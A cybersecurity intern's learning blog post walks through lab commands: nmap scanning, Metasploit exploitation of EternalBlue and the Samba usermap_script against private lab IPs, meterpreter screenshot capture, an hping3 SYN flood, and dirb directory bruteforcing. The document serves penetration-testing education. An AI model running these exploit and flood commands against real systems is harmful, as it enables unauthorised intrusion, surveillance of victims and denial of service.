Dlithe
Cyber Security Internship


Hi Everyone, I'm Darshan Kumar B K from Bangalore. I'm Interested in Ethical Hacking and Programming. I've have take up an internship at Dlithe.
I will be posting all the learning and practical implementations.


Port Scanning (nmap)

nmap command is used for port scanning.All the open ports will be displayed along with its service. In the above scan port 53/tcp is open for domain service.
$ nmap -A 192.168.31.1

$ nmap -sn 192.168.31.0/24
This command show all the connected and running (host is up) devices on the network (router). 0/24 means 0 to 255
all the devices on the networkIf nmap is not picking up any ports, then victim machine's firewall has to be turned off.


Vulnerability Scanning

Tools: Nessus, Burpsuite, AppSpider.



Exploitation

Steps:
Initialize metasploit database

$ sudo msfdb init
Start postgresql database

$ sudo service postgresql start
Open metasploit console

$ msfconsole
Search for the exploit script using CVE or Vulnerability name

msf6> search eternalblue
Import the exploit for the existing vulnerability

msf6> use exploit/windows/smb/ms17_010_eternalblue
Check info of the exploit

msf6 exploit(windows/smb/ms17_010_eternalblue) > info
Set the required details of exploit like RHOSTS with victim's IP address

msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.0.110
Initiate the attack

msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
After successful attack it shows meterpreter> which is the RCE. To check the commands use

meterpreter> help
Now we own the victim's computer, let's try screenshot command to capture victim's screen.

meterpreter> screenshot
Victim's Screen


Hacking Linux System Using Metasploit

Steps:
Initialize metasploit database

$ sudo msfdb init
Start postgresql database

$ sudo service postgresql start
Open metasploit console

$ msfconsole
Search for the exploit script using CVE or Vulnerability name

msf6> search usermap_script
Import the exploit for existing vulnerability

msf6> use exploit/multi/samba/usermap_script
Check the info of the exploit

msf6 exploit(multi/samba/usermap_script) > info
Set the required options like RHOSTS, to initiate the attack

msf6 exploit(multi/samba/usermap_script) > set RHOSTS 192.168.0.111
Initiate the attack

msf6 exploit(multi/samba/usermap_script) > exploit

sessions -i
Now we got control of victim's computer. Lets try to access a file which belongs to victim ( Linux System ). The file is located in /home/msfadmin,
let us navigate to the current folder and view the content of text file.


DoS Attack

$ hping3 -S -p 445 192.168.31.71
First port scanning is done to check if the victim is up and the ports are open. Then a particular port may be selected for attack using -p 445 option. -S is only SYN flag the attacker will not wait for ACK. In the above only 7 packets are sent in 10 seconds.

$ hping3 -S -p 445 192.168.31.71 - flood
The above option of hping3 - flood will flood packets to the victim's computer without waiting for acknowledgement.


Web Application Penetration Testing Methodology

$ dirb http://192.168.31.138
directory bruteforceThe above dirb command does directory bruteforce attack to find all the hidden hyperlinks.
